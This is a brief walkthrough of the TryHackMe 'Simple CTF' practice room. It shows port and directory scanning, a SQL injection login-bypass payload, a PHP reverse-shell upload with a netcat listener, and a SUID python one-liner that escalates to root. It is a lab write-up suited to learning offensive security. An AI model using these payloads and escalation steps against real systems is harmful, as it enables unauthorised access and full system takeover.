# 🧠 TryHackMe – Simple CTF Walkthrough

**CTF Type:** Web Exploitation & Privilege Escalation  
**Platform:** TryHackMe  
**Level:** Beginner  
**Tags:** #CTF #TryHackMe #WebSecurity #PrivilegeEscalation

---

## 🧭 Overview

This writeup covers the full walkthrough for the Simple CTF room on TryHackMe. The objective was to identify open ports, exploit a web vulnerability, gain shell access, and escalate privileges to root.

---

## 🛠 Tools Used

- Nmap  
- Gobuster  
- Burp Suite  
- Netcat  
- LinPEAS  
- Linux CLI

---

## 🕹 Steps

### 1. **Enumeration**
```bash
nmap -sC -sV -oN nmap.txt 10.10.10.10
```
Open ports:
- 22 (SSH)
- 80 (HTTP)

Discovered login page at `/admin`. Ran:
```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 2. **Exploitation**
Used SQL Injection on login page:
```sql
admin' OR '1'='1 --
```
Gained access to file upload panel. Uploaded PHP reverse shell and ran:
```bash
nc -lvnp 4444
```

### 3. **Privilege Escalation**
Used `linpeas.sh` to scan for privesc opportunities. Found:
- `/usr/bin/python` had SUID set

Used:
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Grabbed root flag from `/root/root.txt`.

---

## 📘 Takeaways

- Identified SQL Injection vulnerability
- Practiced reverse shell delivery
- Learned to escalate privileges using SUID binaries
- Reinforced structured enumeration and documentation
